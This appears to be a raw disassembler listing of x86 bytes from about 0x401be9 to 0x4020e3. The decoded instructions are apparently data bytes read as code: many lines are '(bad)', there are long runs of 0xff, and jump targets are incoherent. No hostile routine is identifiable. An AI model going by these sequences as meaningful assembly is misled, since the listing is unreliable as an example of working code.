  401be9:	71 f7                	jno    0x401be2
  401beb:	fe 4a e5             	decb   -0x1b(%edx)
  401bee:	fa                   	cli
  401bef:	14 cc                	adc    $0xcc,%al
  401bf1:	f7 16                	notl   (%esi)
  401bf3:	c3                   	ret
  401bf4:	ea 10 71 ca 05 14 e0 	ljmp   $0xe014,$0x5ca7110
  401bfb:	02 00                	add    (%eax),%al
  401bfd:	fb                   	sti
  401bfe:	02 00                	add    (%eax),%al
  401c00:	fc                   	cld
  401c01:	05 17 d6 08 87       	add    $0x8708d617,%eax
  401c06:	5b                   	pop    %ebx
  401c07:	03 ad 5b 06 61 92    	add    -0x6d9ef9a5(%ebp),%ebp
  401c0d:	0d 20 cd 6a 9d       	or     $0x9d6acd20,%eax
  401c12:	c9                   	leave
  401c13:	4c                   	dec    %esp
  401c14:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401c15:	c3                   	ret
  401c16:	23 a6 ca 3b 91 b0    	and    -0x4f6ec436(%esi),%esp
  401c1c:	4a                   	dec    %edx
  401c1d:	98                   	cwtl
  401c1e:	b4 cf                	mov    $0xcf,%ah
  401c20:	dc e2                	fsub   %st,%st(2)
  401c22:	fe                   	(bad)
  401c23:	ff                   	(bad)
  401c24:	ff                   	(bad)
  401c25:	f8                   	clc
  401c26:	fe                   	(bad)
  401c27:	fd                   	std
  401c28:	fa                   	cli
  401c29:	fb                   	sti
  401c2a:	fc                   	cld
  401c2b:	89 be d0 6e e1 ef    	mov    %edi,-0x101e9130(%esi)
  401c31:	bd f0 f4 8c de       	mov    $0xde8cf4f0,%ebp
  401c36:	e8 79 f5 fb 72       	call   0x733c11b4
  401c3b:	f7 fe                	idiv   %esi
  401c3d:	72 f6                	jb     0x401c35
  401c3f:	fe                   	(bad)
  401c40:	73 f8                	jae    0x401c3a
  401c42:	fe                   	(bad)
  401c43:	73 f7                	jae    0x401c3c
  401c45:	fc                   	cld
  401c46:	72 f6                	jb     0x401c3e
  401c48:	fe                   	(bad)
  401c49:	70 f6                	jo     0x401c41
  401c4b:	fe                   	(bad)
  401c4c:	53                   	push   %ebx
  401c4d:	e9 fb 2c d6 f7       	jmp    0xf816494d
  401c52:	16                   	push   %ss
  401c53:	cc                   	int3
  401c54:	f4                   	hlt
  401c55:	14 b1                	adc    $0xb1,%al
  401c57:	e5 0d                	in     $0xd,%eax
  401c59:	68 d9 03 10 e7       	push   $0xe71003d9
  401c5e:	02 00                	add    (%eax),%al
  401c60:	fd                   	std
  401c61:	05 13 df 09 73       	add    $0x7309df13,%eax
  401c66:	84 06                	test   %al,(%esi)
  401c68:	8d 50 06             	lea    0x6(%eax),%edx
  401c6b:	5c                   	pop    %esp
  401c6c:	7c 2c                	jl     0x401c9a
  401c6e:	3a d3                	cmp    %bl,%dl
  401c70:	be cb de 58 9d       	mov    $0x9d58decb,%esi
  401c75:	b8 11 aa d1 1d       	mov    $0x1dd1aa11,%eax
  401c7a:	9c                   	pushf
  401c7b:	c0 48 9e b9          	rorb   $0xb9,-0x62(%eax)
  401c7f:	a0 ba c8 ff ff       	mov    0xffffc8ba,%al
  401c84:	ff                   	(bad)
  401c85:	ff                   	(bad)
  401c86:	ff                   	(bad)
  401c87:	ff                   	(bad)
  401c88:	ff                   	(bad)
  401c89:	ff                   	(bad)
  401c8a:	ff c6                	inc    %esi
  401c8c:	d6                   	salc
  401c8d:	df 2f                	fildll (%edi)
  401c8f:	af                   	scas   %es:(%edi),%eax
  401c90:	cd a8                	int    $0xa8
  401c92:	ef                   	out    %eax,(%dx)
  401c93:	f4                   	hlt
  401c94:	c4                   	(bad)
  401c95:	fc                   	cld
  401c96:	fd                   	std
  401c97:	96                   	xchg   %eax,%esi
  401c98:	fa                   	cli
  401c99:	fd                   	std
  401c9a:	6b eb f4             	imul   $0xfffffff4,%ebx,%ebp
  401c9d:	6f                   	outsl  %ds:(%esi),(%dx)
  401c9e:	f1                   	int1
  401c9f:	f9                   	stc
  401ca0:	69 e8 f1 69 e7 f0    	imul   $0xf0e769f1,%eax,%ebp
  401ca6:	6b eb f4             	imul   $0xfffffff4,%ebx,%ebp
  401ca9:	6f                   	outsl  %ds:(%esi),(%dx)
  401caa:	f7 fe                	idiv   %esi
  401cac:	68 f1 fd 5a eb       	push   $0xeb5afdf1
  401cb1:	f9                   	stc
  401cb2:	2d d7 f8 18 d0       	sub    $0xd018f8d7,%eax
  401cb7:	f7 14 b9             	notl   (%ecx,%edi,4)
  401cba:	e3 0b                	jecxz  0x401cc7
  401cbc:	5a                   	pop    %edx
  401cbd:	d4 02                	aam    $0x2
  401cbf:	07                   	pop    %es
  401cc0:	f1                   	int1
  401cc1:	04 15                	add    $0x15,%al
  401cc3:	e7 06                	out    %eax,$0x6
  401cc5:	5d                   	pop    %ebp
  401cc6:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401cc7:	09 71 8e             	or     %esi,-0x72(%ecx)
  401cca:	09 52 91             	or     %edx,-0x6f(%edx)
  401ccd:	62 6b dc             	bound  %ebp,-0x24(%ebx)
  401cd0:	ea f0 f3 63 a9 c0 27 	ljmp   $0x27c0,$0xa963f3f0
  401cd7:	c3                   	ret
  401cd8:	df 11                	fists  (%ecx)
  401cda:	b9 da 55 b7 cd       	mov    $0xcdb755da,%ecx
  401cdf:	b5 c9                	mov    $0xc9,%ch
  401ce1:	d5 ff                	aad    $0xff
  401ce3:	ff                   	(bad)
  401ce4:	ff                   	(bad)
  401ce5:	fc                   	cld
  401ce6:	fc                   	cld
  401ce7:	fe                   	(bad)
  401ce8:	fb                   	sti
  401ce9:	fb                   	sti
  401cea:	fd                   	std
  401ceb:	ef                   	out    %eax,(%dx)
  401cec:	f2 f5                	repnz cmc
  401cee:	31 90 b0 5b d1 e3    	xor    %edx,-0x1c2ea450(%eax)
  401cf4:	99                   	cltd
  401cf5:	e4 ed                	in     $0xed,%al
  401cf7:	96                   	xchg   %eax,%esi
  401cf8:	ed                   	in     (%dx),%eax
  401cf9:	f3 57                	repz push %edi
  401cfb:	d0 e0                	shl    $1,%al
  401cfd:	6f                   	outsl  %ds:(%esi),(%dx)
  401cfe:	ef                   	out    %eax,(%dx)
  401cff:	f6 5e d4             	negb   -0x2c(%esi)
  401d02:	e3 59                	jecxz  0x401d5d
  401d04:	cc                   	int3
  401d05:	dc 66 e3             	fsubl  -0x1d(%esi)
  401d08:	ee                   	out    %al,(%dx)
  401d09:	7d fa                	jge    0x401d05
  401d0b:	fd                   	std
  401d0c:	78 f6                	js     0x401d04
  401d0e:	fd                   	std
  401d0f:	76 f8                	jbe    0x401d09
  401d11:	fe                   	(bad)
  401d12:	58                   	pop    %eax
  401d13:	eb fb                	jmp    0x401d10
  401d15:	30 d8                	xor    %bl,%al
  401d17:	f8                   	clc
  401d18:	1c d5                	sbb    $0xd5,%al
  401d1a:	f8                   	clc
  401d1b:	15 b9 dd 06 27       	adc    $0x2706ddb9,%eax
  401d20:	db 05 1c d8 04 46    	fildl  0x4604d81c
  401d26:	b1 0a                	mov    $0xa,%cl
  401d28:	63 c1                	arpl   %eax,%ecx
  401d2a:	18 44 b1 a0          	sbb    %al,-0x60(%ecx,%esi,4)
  401d2e:	a3 e7 e9 f4 f7       	mov    %eax,0xf7f4e9e7
  401d33:	9a c6 d3 4a df ee 06 	lcall  $0x6ee,$0xdf4ad3c6
  401d3a:	d4 ef                	aam    $0xef
  401d3c:	43                   	inc    %ebx
  401d3d:	c4                   	(bad)
  401d3e:	da f4                	(bad)
  401d40:	f6 f8                	idiv   %al
  401d42:	ff                   	(bad)
  401d43:	ff                   	(bad)
  401d44:	ff f4                	push   %esp
  401d46:	f4                   	hlt
  401d47:	fe                   	(bad)
  401d48:	e9 e9 fc fc fc       	jmp    0xfd3d1a36
  401d4d:	fd                   	std
  401d4e:	7c af                	jl     0x401cff
  401d50:	c3                   	ret
  401d51:	2f                   	das
  401d52:	ba d9 2d b2 cf       	mov    $0xcfb22dd9,%edx
  401d57:	47                   	inc    %edi
  401d58:	c3                   	ret
  401d59:	d9 37                	fnstenv (%edi)
  401d5b:	b5 ce                	mov    $0xce,%ch
  401d5d:	6c                   	insb   (%dx),%es:(%edi)
  401d5e:	ee                   	out    %al,(%dx)
  401d5f:	f6 5d d9             	negb   -0x27(%ebp)
  401d62:	e6 4f                	out    %al,$0x4f
  401d64:	bf d1 6d f0 f8       	mov    $0xf8f06dd1,%edi
  401d69:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401d6a:	fa                   	cli
  401d6b:	fd                   	std
  401d6c:	97                   	xchg   %eax,%edi
  401d6d:	f7 fd                	idiv   %ebp
  401d6f:	71 f6                	jno    0x401d67
  401d71:	fe                   	(bad)
  401d72:	74 f6                	je     0x401d6a
  401d74:	fe                   	(bad)
  401d75:	65 f2 fd             	gs repnz std
  401d78:	39 dc                	cmp    %ebx,%esp
  401d7a:	f8                   	clc
  401d7b:	19 d8                	sbb    %ebx,%eax
  401d7d:	fa                   	cli
  401d7e:	0c 6a                	or     $0x6a,%al
  401d80:	d2 08                	rorb   %cl,(%eax)
  401d82:	34 b7                	xor    $0xb7,%al
  401d84:	06                   	push   %es
  401d85:	37                   	aaa
  401d86:	bd 05 4b a2 37       	mov    $0x37a24b05,%ebp
  401d8b:	47                   	inc    %edi
  401d8c:	bb d7 d8 f6 b6       	mov    $0xb6f6d8d7,%ebx
  401d91:	e2 ea                	loop   0x401d7d
  401d93:	c1 e8 ee             	shr    $0xee,%eax
  401d96:	44                   	inc    %esp
  401d97:	de ed                	fsubrp %st,%st(5)
  401d99:	05 e3 fa 68 d8       	add    $0xd868fae3,%eax
  401d9e:	e7 fe                	out    %eax,$0xfe
  401da0:	fe                   	(bad)
  401da1:	fe                   	(bad)
  401da2:	ff                   	(bad)
  401da3:	ff                   	(bad)
  401da4:	ff e0                	jmp    *%eax
  401da6:	e0 fe                	loopne 0x401da6
  401da8:	b2 b2                	mov    $0xb2,%dl
  401daa:	f9                   	stc
  401dab:	f3 f3 fc             	repz repz cld
  401dae:	d3 de                	rcr    %cl,%esi
  401db0:	e4 55                	in     $0x55,%al
  401db2:	ce                   	into
  401db3:	de 3a                	fidivrs (%edx)
  401db5:	dd f7                	(bad)
  401db7:	15 ab d2 17 b0       	adc    $0xb017d2ab,%eax
  401dbc:	d9 2c ba             	fldcw  (%edx,%edi,4)
  401dbf:	d7                   	xlat   %ds:(%ebx)
  401dc0:	2f                   	das
  401dc1:	b4 d1                	mov    $0xd1,%ah
  401dc3:	32 a1 bd 5e ce e1    	xor    -0x1e31a143(%ecx),%ah
  401dc9:	b5 f7                	mov    $0xf7,%ch
  401dcb:	fb                   	sti
  401dcc:	d9 fc                	frndint
  401dce:	fc                   	cld
  401dcf:	80 f7 fe             	xor    $0xfe,%bh
  401dd2:	71 f6                	jno    0x401dca
  401dd4:	fe                   	(bad)
  401dd5:	73 f8                	jae    0x401dcf
  401dd7:	fe                   	(bad)
  401dd8:	6b f4 fd             	imul   $0xfffffffd,%esp,%esi
  401ddb:	27                   	daa
  401ddc:	d8 fc                	fdivr  %st(4),%st
  401dde:	12 a5 d7 0d 4b bd    	adc    -0x42b4f229(%ebp),%ah
  401de4:	09 53 a9             	or     %edx,-0x57(%ebx)
  401de7:	06                   	push   %es
  401de8:	6c                   	insb   (%dx),%es:(%edi)
  401de9:	67 5f                	addr16 pop %edi
  401deb:	61                   	popa
  401dec:	d6                   	salc
  401ded:	ef                   	out    %eax,(%dx)
  401dee:	f6 f8                	idiv   %al
  401df0:	86 de                	xchg   %bl,%dh
  401df2:	e9 81 f5 f8 25       	jmp    0x26391378
  401df7:	ee                   	out    %al,(%dx)
  401df8:	f9                   	stc
  401df9:	1a d4                	sbb    %ah,%dl
  401dfb:	ee                   	out    %al,(%dx)
  401dfc:	b9 e6 f0 fe fe       	mov    $0xfefef0e6,%ecx
  401e01:	fe                   	(bad)
  401e02:	ff                   	(bad)
  401e03:	ff                   	(bad)
  401e04:	ff                   	(bad)
  401e05:	f8                   	clc
  401e06:	f8                   	clc
  401e07:	fe                   	(bad)
  401e08:	ef                   	out    %eax,(%dx)
  401e09:	f0 fc                	lock cld
  401e0b:	fc                   	cld
  401e0c:	fc                   	cld
  401e0d:	fd                   	std
  401e0e:	f7 f9                	idiv   %ecx
  401e10:	f9                   	stc
  401e11:	8b ca                	mov    %edx,%ecx
  401e13:	d6                   	salc
  401e14:	71 f3                	jno    0x401e09
  401e16:	f8                   	clc
  401e17:	66 ef                	out    %ax,(%dx)
  401e19:	f8                   	clc
  401e1a:	44                   	inc    %esp
  401e1b:	e0 f9                	loopne 0x401e16
  401e1d:	16                   	push   %ss
  401e1e:	c6                   	(bad)
  401e1f:	ef                   	out    %eax,(%dx)
  401e20:	13 b8 e0 0d 90 c4    	adc    -0x3b6ff220(%eax),%edi
  401e26:	12 2f                	adc    (%edi),%ch
  401e28:	c6                   	(bad)
  401e29:	52                   	push   %edx
  401e2a:	9c                   	pushf
  401e2b:	d9 b5 ec f2 da fd    	fnstenv -0x2250d14(%ebp)
  401e31:	fe                   	(bad)
  401e32:	ac                   	lods   %ds:(%esi),%al
  401e33:	fb                   	sti
  401e34:	fe                   	(bad)
  401e35:	7f f8                	jg     0x401e2f
  401e37:	fe                   	(bad)
  401e38:	77 f8                	ja     0x401e32
  401e3a:	fd                   	std
  401e3b:	56                   	push   %esi
  401e3c:	ea fc 12 c5 ef 12 81 	ljmp   $0x8112,$0xefc512fc
  401e43:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  401e44:	07                   	pop    %es
  401e45:	6e                   	outsb  %ds:(%esi),(%dx)
  401e46:	68 06 24 b2 b5       	push   $0xb5b22406
  401e4b:	b4 ef                	mov    $0xef,%ah
  401e4d:	d8 ed                	fsubr  %st(5),%st
  401e4f:	f1                   	int1
  401e50:	86 d3                	xchg   %dl,%bl
  401e52:	e0 66                	loopne 0x401eba
  401e54:	f0 fa                	lock cli
  401e56:	3b ef                	cmp    %edi,%ebp
  401e58:	f6 81 d9 e8 f1 f9 fa 	testb  $0xfa,-0x60e1727(%ecx)
  401e5f:	fe                   	(bad)
  401e60:	fe                   	(bad)
  401e61:	fe                   	(bad)
  401e62:	ff                   	(bad)
  401e63:	ff                   	(bad)
  401e64:	ff                   	(bad)
  401e65:	fc                   	cld
  401e66:	fd                   	std
  401e67:	fe                   	(bad)
  401e68:	fa                   	cli
  401e69:	fc                   	cld
  401e6a:	fd                   	std
  401e6b:	f8                   	clc
  401e6c:	fd                   	std
  401e6d:	f9                   	stc
  401e6e:	fd                   	std
  401e6f:	fd                   	std
  401e70:	fd                   	std
  401e71:	c8 de e6 86          	enter  $0xe6de,$0x86
  401e75:	dd e4                	fucom  %st(4)
  401e77:	c3                   	ret
  401e78:	fb                   	sti
  401e79:	fc                   	cld
  401e7a:	78 f4                	js     0x401e70
  401e7c:	fd                   	std
  401e7d:	3d de f8 15 cb       	cmp    $0xcb15f8de,%eax
  401e82:	f4                   	hlt
  401e83:	16                   	push   %ss
  401e84:	c7                   	(bad)
  401e85:	ef                   	out    %eax,(%dx)
  401e86:	11 50 b7             	adc    %edx,-0x49(%eax)
  401e89:	1e                   	push   %ds
  401e8a:	34 d7                	xor    $0xd7,%al
  401e8c:	2f                   	das
  401e8d:	62                   	(bad)
  401e8e:	d8 67 ba             	fsubs  -0x46(%edi)
  401e91:	d7                   	xlat   %ds:(%ebx)
  401e92:	73 dd                	jae    0x401e71
  401e94:	e9 8d f9 fb 82       	jmp    0x833c1826
  401e99:	f9                   	stc
  401e9a:	fc                   	cld
  401e9b:	6c                   	insb   (%dx),%es:(%edi)
  401e9c:	f4                   	hlt
  401e9d:	fd                   	std
  401e9e:	1d cf f5 0f b0       	sbb    $0xb00ff5cf,%eax
  401ea3:	a3 1e 8c 5f 67       	mov    %eax,0x675f8c1e
  401ea8:	75 c8                	jne    0x401e72
  401eaa:	ea eb f8 f4 f9 fb 76 	ljmp   $0x76fb,$0xf9f4f8eb
  401eb1:	ca db 60             	lret   $0x60db
  401eb4:	db e9                	fucomi %st(1),%st
  401eb6:	73 d3                	jae    0x401e8b
  401eb8:	de db                	(bad)
  401eba:	f1                   	int1
  401ebb:	f5                   	cmc
  401ebc:	fb                   	sti
  401ebd:	fd                   	std
  401ebe:	fd                   	std
  401ebf:	fe                   	(bad)
  401ec0:	fe                   	(bad)
  401ec1:	fe                   	(bad)
  401ec2:	f6 ff                	idiv   %bh
  401ec4:	ff d3                	call   *%ebx
  401ec6:	fc                   	cld
  401ec7:	fd                   	std
  401ec8:	fb                   	sti
  401ec9:	fd                   	std
  401eca:	fd                   	std
  401ecb:	e5 fa                	in     $0xfa,%eax
  401ecd:	e6 f1                	out    %al,$0xf1
  401ecf:	fc                   	cld
  401ed0:	f1                   	int1
  401ed1:	f0 f5                	lock cmc
  401ed3:	f7 a8 d2 dc ae e8    	imull  -0x1751232e(%eax)
  401ed9:	ee                   	out    %al,(%dx)
  401eda:	b6 fb                	mov    $0xfb,%dh
  401edc:	fd                   	std
  401edd:	70 f1                	jo     0x401ed0
  401edf:	fb                   	sti
  401ee0:	2e d9 f9             	cs fyl2xp1
  401ee3:	16                   	push   %ss
  401ee4:	d1 fa                	sar    $1,%edx
  401ee6:	1b a4 d5 61 75 d1 44 	sbb    0x44d17561(%ebp,%edx,8),%esp
  401eed:	56                   	push   %esi
  401eee:	d6                   	salc
  401eef:	2b 4f d2             	sub    -0x2e(%edi),%ecx
  401ef2:	2f                   	das
  401ef3:	5d                   	pop    %ebp
  401ef4:	ce                   	into
  401ef5:	51                   	push   %ecx
  401ef6:	8f c8 7d be          	(bad)
  401efa:	d3 65 b0             	shll   %cl,-0x50(%ebp)
  401efd:	c9                   	leave
  401efe:	0f 8f 9e 09 7c 93    	jg     0x93bc28a2
  401f04:	16                   	push   %ss
  401f05:	5d                   	pop    %ebp
  401f06:	7f 32                	jg     0x401f3a
  401f08:	35 ce be c2 e6       	xor    $0xe6c2bece,%eax
  401f0d:	fb                   	sti
  401f0e:	fc                   	cld
  401f0f:	fc                   	cld
  401f10:	c3                   	ret
  401f11:	e6 ee                	out    %al,$0xee
  401f13:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  401f14:	e0 ea                	loopne 0x401f00
  401f16:	cd e8                	int    $0xe8
  401f18:	ed                   	in     (%dx),%eax
  401f19:	e3 fb                	jecxz  0x401f16
  401f1b:	fc                   	cld
  401f1c:	e3 fe                	jecxz  0x401f1c
  401f1e:	fe                   	(bad)
  401f1f:	fe                   	(bad)
  401f20:	fe                   	(bad)
  401f21:	fe                   	(bad)
  401f22:	f6 fe                	idiv   %dh
  401f24:	fe                   	(bad)
  401f25:	d2 fc                	sar    %cl,%ah
  401f27:	fd                   	std
  401f28:	fb                   	sti
  401f29:	fd                   	std
  401f2a:	fd                   	std
  401f2b:	cc                   	int3
  401f2c:	f6 cb df             	test   $0xdf,%bl
  401f2f:	f9                   	stc
  401f30:	e0 ff                	loopne 0x401f31
  401f32:	ff                   	(bad)
  401f33:	ff                   	lcall  (bad)
  401f34:	dc e8                	fsubr  %st,%st(0)
  401f36:	ed                   	in     (%dx),%eax
  401f37:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  401f38:	d2 dc                	rcr    %cl,%ah
  401f3a:	9c                   	pushf
  401f3b:	df e7                	(bad)
  401f3d:	9a f9 fc 59 e9 fa 1d 	lcall  $0x1dfa,$0xe959fcf9
  401f44:	d0 f7                	shl    $1,%bh
  401f46:	1c cc                	sbb    $0xcc,%al
  401f48:	ef                   	out    %eax,(%dx)
  401f49:	7e b1                	jle    0x401efc
  401f4b:	cd ab                	int    $0xab
  401f4d:	b0 e9                	mov    $0xe9,%al
  401f4f:	8e 8f ea 8c 8f e1    	mov    -0x1e707316(%edi),%cs
  401f55:	97                   	xchg   %eax,%edi
  401f56:	aa                   	stos   %al,%es:(%edi)
  401f57:	d6                   	salc
  401f58:	b8 ca db 6b 81       	mov    $0x816bdbca,%eax
  401f5d:	bc 04 3c a7 03       	mov    $0x3a73c04,%esp
  401f62:	2b c4                	sub    %esp,%eax
  401f64:	08 1f                	or     %bl,(%edi)
  401f66:	b9 05 01 d0 63       	mov    $0x63d00105,%ecx
  401f6b:	64 d9 e7             	fs (bad)
  401f6e:	ef                   	out    %eax,(%dx)
  401f6f:	fa                   	cli
  401f70:	f3 fb                	repz sti
  401f72:	fc                   	cld
  401f73:	e7 f2                	out    %eax,$0xf2
  401f75:	f6 fa                	idiv   %dl
  401f77:	fb                   	sti
  401f78:	fc                   	cld
  401f79:	e5 fd                	in     $0xfd,%eax
  401f7b:	fe                   	(bad)
  401f7c:	e2 fe                	loop   0x401f7c
  401f7e:	fd                   	std
  401f7f:	f3 fc                	repz cld
  401f81:	f3 fb                	repz sti
  401f83:	fe                   	(bad)
  401f84:	fe                   	(bad)
  401f85:	ef                   	out    %eax,(%dx)
  401f86:	fe                   	(bad)
  401f87:	fe                   	(bad)
  401f88:	f6 fe                	idiv   %dh
  401f8a:	fe                   	(bad)
  401f8b:	d3 f8                	sar    %cl,%eax
  401f8d:	d5 e3                	aad    $0xe3
  401f8f:	fa                   	cli
  401f90:	e5 f6                	in     $0xf6,%eax
  401f92:	fe                   	(bad)
  401f93:	fd                   	std
  401f94:	fc                   	cld
  401f95:	fe                   	(bad)
  401f96:	fd                   	std
  401f97:	d0 dc                	rcr    $1,%ah
  401f99:	e3 96                	jecxz  0x401f31
  401f9b:	d0 dc                	rcr    $1,%ah
  401f9d:	93                   	xchg   %eax,%ebx
  401f9e:	e0 e9                	loopne 0x401f89
  401fa0:	70 f0                	jo     0x401f92
  401fa2:	f8                   	clc
  401fa3:	27                   	daa
  401fa4:	d6                   	salc
  401fa5:	f9                   	stc
  401fa6:	17                   	pop    %ss
  401fa7:	d0 f9                	sar    $1,%cl
  401fa9:	5c                   	pop    %esp
  401faa:	bd d5 e1 ee f2       	mov    $0xf2eee1d5,%ebp
  401faf:	f8                   	clc
  401fb0:	f9                   	stc
  401fb1:	fd                   	std
  401fb2:	eb ec                	jmp    0x401fa0
  401fb4:	fa                   	cli
  401fb5:	fa                   	cli
  401fb6:	fb                   	sti
  401fb7:	fd                   	std
  401fb8:	c4 c7 ee 4b          	(bad)
  401fbc:	4d                   	dec    %ebp
  401fbd:	db 05 0c e2 0b 09    	fildl  0x90be20c
  401fc3:	f7 05 02 ea 05 01 d3 	testl  $0xd73b3cd3,0x105ea02
  401fca:	3c 3b d7 
  401fcd:	e3 eb                	jecxz  0x401fba
  401fcf:	fa                   	cli
  401fd0:	f9                   	stc
  401fd1:	fe                   	(bad)
  401fd2:	fe                   	(bad)
  401fd3:	ff                   	(bad)
  401fd4:	ff                   	(bad)
  401fd5:	ff                   	(bad)
  401fd6:	ff                   	(bad)
  401fd7:	ff                   	(bad)
  401fd8:	ff f4                	push   %esp
  401fda:	fe                   	(bad)
  401fdb:	fe                   	(bad)
  401fdc:	f4                   	hlt
  401fdd:	fe                   	(bad)
  401fde:	fd                   	std
  401fdf:	d1 f7                	shl    $1,%edi
  401fe1:	d0 ff                	sar    $1,%bh
  401fe3:	ff                   	(bad)
  401fe4:	ff                   	(bad)
  401fe5:	ff                   	(bad)
  401fe6:	ff                   	(bad)
  401fe7:	ff f2                	push   %edx
  401fe9:	fe                   	(bad)
  401fea:	fe                   	(bad)
  401feb:	f8                   	clc
  401fec:	fe                   	(bad)
  401fed:	fe                   	(bad)
  401fee:	fd                   	std
  401fef:	fe                   	(bad)
  401ff0:	fe                   	(bad)
  401ff1:	ef                   	out    %eax,(%dx)
  401ff2:	fe                   	(bad)
  401ff3:	fd                   	std
  401ff4:	fa                   	cli
  401ff5:	fe                   	(bad)
  401ff6:	fd                   	std
  401ff7:	ff                   	(bad)
  401ff8:	ff                   	(bad)
  401ff9:	ff e4                	jmp    *%esp
  401ffb:	eb ef                	jmp    0x401fec
  401ffd:	8b c4                	mov    %esp,%eax
  401fff:	d4 6e                	aam    $0x6e
  402001:	dd e8                	fucomp %st(0)
  402003:	2d cc ee 15 cb       	sub    $0xcb15eecc,%eax
  402008:	f4                   	hlt
  402009:	3d be dd cf e2       	cmp    $0xe2cfddbe,%eax
  40200e:	e8 f5 f5 fd c4       	call   0xc53e1608
  402013:	c5 f8 fc             	(bad)
  402016:	fd                   	std
  402017:	fd                   	std
  402018:	7a 7d                	jp     0x402097
  40201a:	dd 05 05 e7 07 05    	fldl   0x507e705
  402020:	e0 1f                	loopne 0x402041
  402022:	1b f4                	sbb    %esp,%esi
  402024:	07                   	pop    %es
  402025:	06                   	push   %es
  402026:	ef                   	out    %eax,(%dx)
  402027:	1d 1b d1 83 84       	sbb    $0x8483d11b,%eax
  40202c:	df f7                	fcomip %st(7),%st
  40202e:	f8                   	clc
  40202f:	fd                   	std
  402030:	f8                   	clc
  402031:	fe                   	(bad)
  402032:	fd                   	std
  402033:	fd                   	std
  402034:	fe                   	(bad)
  402035:	fe                   	(bad)
  402036:	ff                   	(bad)
  402037:	ff                   	(bad)
  402038:	ff                   	(bad)
  402039:	ff                   	(bad)
  40203a:	ff                   	(bad)
  40203b:	ff                   	(bad)
  40203c:	fd                   	std
  40203d:	fe                   	(bad)
  40203e:	fe                   	(bad)
  40203f:	bd f5 bd ff ff       	mov    $0xffffbdf5,%ebp
  402044:	ff                   	(bad)
  402045:	ff                   	(bad)
  402046:	ff                   	(bad)
  402047:	ff                   	(bad)
  402048:	ff                   	(bad)
  402049:	ff                   	(bad)
  40204a:	ff                   	(bad)
  40204b:	ff                   	(bad)
  40204c:	ff                   	(bad)
  40204d:	ff                   	(bad)
  40204e:	ff                   	(bad)
  40204f:	ff                   	(bad)
  402050:	ff                   	(bad)
  402051:	ff                   	(bad)
  402052:	ff                   	(bad)
  402053:	ff                   	(bad)
  402054:	ff                   	(bad)
  402055:	ff                   	(bad)
  402056:	ff                   	(bad)
  402057:	ff                   	(bad)
  402058:	ff                   	(bad)
  402059:	ff                   	(bad)
  40205a:	ff                   	(bad)
  40205b:	ff                   	(bad)
  40205c:	ff                   	ljmp   (bad)
  40205d:	ee                   	out    %al,(%dx)
  40205e:	f1                   	int1
  40205f:	f4                   	hlt
  402060:	94                   	xchg   %eax,%esp
  402061:	bd cd 47 ac c8       	mov    $0xc8ac47cd,%ebp
  402066:	2c b9                	sub    $0xb9,%al
  402068:	dd 57 b7             	fstl   -0x49(%edi)
  40206b:	d4 db                	aam    $0xdb
  40206d:	e5 ea                	in     $0xea,%eax
  40206f:	ee                   	out    %al,(%dx)
  402070:	ee                   	out    %al,(%dx)
  402071:	fd                   	std
  402072:	ab                   	stos   %eax,%es:(%edi)
  402073:	ab                   	stos   %eax,%es:(%edi)
  402074:	fe                   	(bad)
  402075:	fd                   	std
  402076:	fd                   	std
  402077:	fe 8b 8c e1 1c 1c    	decb   0x1c1ce18c(%ebx)
  40207d:	c5 14 14             	lds    (%esp,%edx,1),%edx
  402080:	c9                   	leave
  402081:	29 24 f6             	sub    %esp,(%esi,%esi,8)
  402084:	1a 1a                	sbb    (%edx),%bl
  402086:	d4 76                	aam    $0x76
  402088:	78 cd                	js     0x402057
  40208a:	fd                   	std
  40208b:	fd                   	std
  40208c:	fe                   	(bad)
  40208d:	f9                   	stc
  40208e:	fe                   	(bad)
  40208f:	fd                   	std
  402090:	ec                   	in     (%dx),%al
  402091:	fe                   	(bad)
  402092:	fd                   	std
  402093:	fd                   	std
  402094:	fe                   	(bad)
  402095:	fe                   	(bad)
  402096:	ff                   	(bad)
  402097:	ff                   	(bad)
  402098:	ff                   	(bad)
  402099:	ff                   	(bad)
  40209a:	ff                   	(bad)
  40209b:	ff                   	(bad)
  40209c:	ff                   	(bad)
  40209d:	ff                   	(bad)
  40209e:	ff f7                	push   %edi
  4020a0:	fd                   	std
  4020a1:	f7 ff                	idiv   %edi
  4020a3:	ff                   	(bad)
  4020a4:	ff                   	(bad)
  4020a5:	ff                   	(bad)
  4020a6:	ff                   	(bad)
  4020a7:	ff                   	(bad)
  4020a8:	ff                   	(bad)
  4020a9:	ff                   	(bad)
  4020aa:	ff                   	(bad)
  4020ab:	ff                   	(bad)
  4020ac:	ff                   	(bad)
  4020ad:	ff                   	(bad)
  4020ae:	ff                   	(bad)
  4020af:	ff                   	(bad)
  4020b0:	ff                   	(bad)
  4020b1:	ff                   	(bad)
  4020b2:	ff                   	(bad)
  4020b3:	ff                   	(bad)
  4020b4:	ff                   	(bad)
  4020b5:	ff                   	(bad)
  4020b6:	ff                   	(bad)
  4020b7:	ff                   	(bad)
  4020b8:	ff                   	(bad)
  4020b9:	ff                   	(bad)
  4020ba:	ff                   	(bad)
  4020bb:	ff                   	(bad)
  4020bc:	ff                   	(bad)
  4020bd:	fd                   	std
  4020be:	fd                   	std
  4020bf:	fd                   	std
  4020c0:	fd                   	std
  4020c1:	fd                   	std
  4020c2:	fd                   	std
  4020c3:	e7 ed                	out    %eax,$0xed
  4020c5:	f0 c7                	lock (bad)
  4020c7:	d4 dd                	aam    $0xdd
  4020c9:	e3 e9                	jecxz  0x4020b4
  4020cb:	ed                   	in     (%dx),%eax
  4020cc:	fd                   	std
  4020cd:	fd                   	std
  4020ce:	fd                   	std
  4020cf:	fd                   	std
  4020d0:	fd                   	std
  4020d1:	fd                   	std
  4020d2:	fc                   	cld
  4020d3:	fd                   	std
  4020d4:	fe                   	(bad)
  4020d5:	fd                   	std
  4020d6:	fd                   	std
  4020d7:	fe                   	(bad)
  4020d8:	f0 f0 fc             	lock lock cld
  4020db:	b4 b3                	mov    $0xb3,%ah
  4020dd:	ef                   	out    %eax,(%dx)
  4020de:	61                   	popa
  4020df:	65 c9                	gs leave
  4020e1:	34 37                	xor    $0x37,%al
  4020e3:	cc                   	int3
